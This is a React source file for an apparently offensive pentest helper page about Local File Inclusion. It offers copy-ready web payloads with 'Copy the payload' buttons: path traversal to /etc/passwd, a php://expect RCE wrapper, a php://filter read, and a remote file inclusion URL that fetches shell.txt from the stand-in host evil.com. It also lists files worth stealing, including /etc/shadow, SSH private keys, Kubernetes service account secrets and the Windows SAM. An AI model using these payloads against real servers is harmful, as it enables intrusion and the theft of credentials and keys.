import React from 'react';
import type { ReactElement } from 'react';
import { Button, message, Typography, Divider } from 'antd';
import { CopyOutlined, LinkOutlined } from '@ant-design/icons';
import Clipboard from 'react-clipboard.js';

const { Title, Paragraph, Text } = Typography;

const successInfoCopy = () => {
    message.success( 'Your payload has been copied successfully!' );
};

const successInfoEncodeURL = () => {
    message.success( 'Your payload URL encoded has been copied successfully!' );
};

export default function LFI () {
    const directoryTraversal = `foo.php?file=../../../../../../../etc/passwd`;
    const phpWrapperExpect = `/example1.php?page=expect://ls`;
    const phpWrapperFilter = `/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd`;
    const phpWrapperFiltersManual = [
        { name: 'String Filters', url: 'https://www.php.net/manual/en/filters.string.php' },
        { name: 'Conversion Filters', url: 'https://www.php.net/manual/en/filters.convert.php' }
    ]
    const phpRfi = `http://example.com/index.php?page=http://evil.com/shell.txt`;
    const linux = [
        { title: '/etc/passwd' },
        { title: '/etc/shadow' },
        { title: '/etc/issue' },
        { title: '/etc/group' },
        { title: '/etc/hostname' },
        { title: '/etc/ssh/ssh_config' },
        { title: '/etc/ssh/sshd_config' },
        { title: '/root/.ssh/id_rsa' },
        { title: '/root/.ssh/authorized_keys' },
        { title: '/home/$USER/.ssh/authorized_keys' },
        { title: '/home/$USER/.ssh/id_rsa' },
        { title: '/proc/[0-9]*/fd/[0-9]*' },
        { title: '/proc/mounts' },
        { title: '/home/$USER/.bash_history' },
        { title: '/home/$USER/.ssh/id_rsa' },
        { title: '/var/run/secrets/kubernetes.io/serviceaccount' },
        { title: '/var/lib/mlocate/mlocate.db' },
        { title: '/var/lib/mlocate.db' }
    ];
    const apache = [
        { title: '/etc/apache2/apache2.conf' },
        { title: '/usr/local/etc/apache2/httpd.conf' },
        { title: '/etc/httpd/conf/httpd.conf' },
        { title: 'Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log' },
        { title: 'Debian/Ubuntu -> /var/log/apache2/access.log' },
        { title: 'FreeBSD -> /var/log/httpd-access.log' },
        { title: '/var/log/apache/access.log' },
        { title: '/var/log/apache/error.log' },
        { title: '/var/log/apache2/access.log' },
        { title: '/var/log/apache/error.log' }
    ];
    const nginx = [
        { title: '/etc/nginx/nginx.conf' },
        { title: '/usr/local/nginx/conf/nginx.conf' },
        { title: '/usr/local/etc/nginx/nginx.conf' },
        { title: '/var/log/nginx/access.log' },
        { title: '/var/log/nginx/error.log' },
    ];
    const mysql = [
        { title: '/var/lib/mysql/mysql/user.frm' },
        { title: '/var/lib/mysql/mysql/user.MYD' },
        { title: '/var/lib/mysql/mysql/user.MYI' }
    ];
    const windows = [
        { title: '/boot.ini' },
        { title: '/autoexec.bat' },
        { title: '/windows/system32/drivers/etc/hosts' },
        { title: '/windows/repair/SAM' },
        { title: '/windows/panther/unattended.xml' },
        { title: '/windows/panther/unattend/unattended.xml' },
        { title: '/windows/system32/license.rtf' },
        { title: '/windows/system32/eula.txt' }
    ];

    return (
        <div style={{ margin: 15 }}>
            <Title level={2} style={{ fontWeight: 'bold' }}>
                LFI
            </Title>
            <Paragraph>
                LFI stands for Local File Includes - it's a file local
                inclusion vulnerability that allows an attacker
                to include files that exist on the target web server.
            </Paragraph>
            <Paragraph>
                Typically this is exploited by abusing dynamic file inclusion
                mechanisms that don't sanitize user input.
            </Paragraph>
            <div key='a'>
                <Title level={3}>Directory traversal</Title>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>{directoryTraversal}</Text></pre>
                </Paragraph>
                {copyButton(directoryTraversal)}
            </div>
            <Divider dashed />
            <div key='b'>
                <Title level={3}>PHP php://expect Wrapper RCE</Title>
                <Paragraph>
                    <b>Note: This wrapper is not enabled by default.</b>
                </Paragraph>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>{phpWrapperExpect}</Text></pre>
                </Paragraph>
                {copyButton(phpWrapperExpect)}
            </div>
            <Divider dashed />
            <div key='c'>
                <Title level={3}>PHP Wrapper php://filter</Title>
                <Paragraph>
                    You can find other filters in PHP manual:
                </Paragraph>
                <ul>
                    {phpWrapperFiltersManual.map((k, i) => {
                        return <li key={i}>
                            <a href={k.url} target="_blank">{k.name}</a>
                        </li>
                    })}
                </ul>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>{phpWrapperFilter}</Text></pre>
                </Paragraph>
                {copyButton(phpWrapperFilter)}
            </div>
            <Divider dashed />
            <div key='d'>
                <Title level={3}>PHP Remote File Inclusion (RFI)</Title>
                <Paragraph>
                    Remote file inclusion in PHP is a vulnerability that allows an
                    attacker to execute arbitrary PHP code by including a remote
                    file located on a server controlled by the attacker.
                </Paragraph>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>{phpRfi}</Text></pre>
                </Paragraph>
                {copyButton(phpRfi)}
            </div>
            <Divider dashed />
            <div key='e'>
                <Title level={3}>Useful LFI files</Title>
                <Title level={4}>Linux</Title>
                {mapFileEntries(linux)}
                <Divider dashed />
                <Title level={4}>Apache</Title>
                {mapFileEntries(apache)}
                <Divider dashed />
                <Title level={4}>Nginx</Title>
                {mapFileEntries(nginx)}
                <Divider dashed />
                <Title level={4}>MySQL</Title>
                {mapFileEntries(mysql)}
                <Divider dashed />
                <Title level={4}>Windows</Title>
                {mapFileEntries(windows)}
            </div>
        </div>
    );
};

function mapFileEntries(arr: {title: string}[]): ReactElement<typeof Paragraph>[]  {
    return arr.map((k, i) => {
        return (
            <Paragraph key={i}>
                <pre><Text copyable>{k.title}</Text></pre>
            </Paragraph>
        );
    })
}

function copyButton(clipboardData: string): ReactElement {
    return <>
        <Clipboard component='a' data-clipboard-text={clipboardData}>
            <Button type='primary' onClick={successInfoCopy} style={{ marginRight: 15 }}>
                <CopyOutlined /> Copy the payload
            </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(clipboardData)}>
            <Button type='dashed' onClick={successInfoEncodeURL}>
                <LinkOutlined /> URL encoded
            </Button>
        </Clipboard>
    </>
}
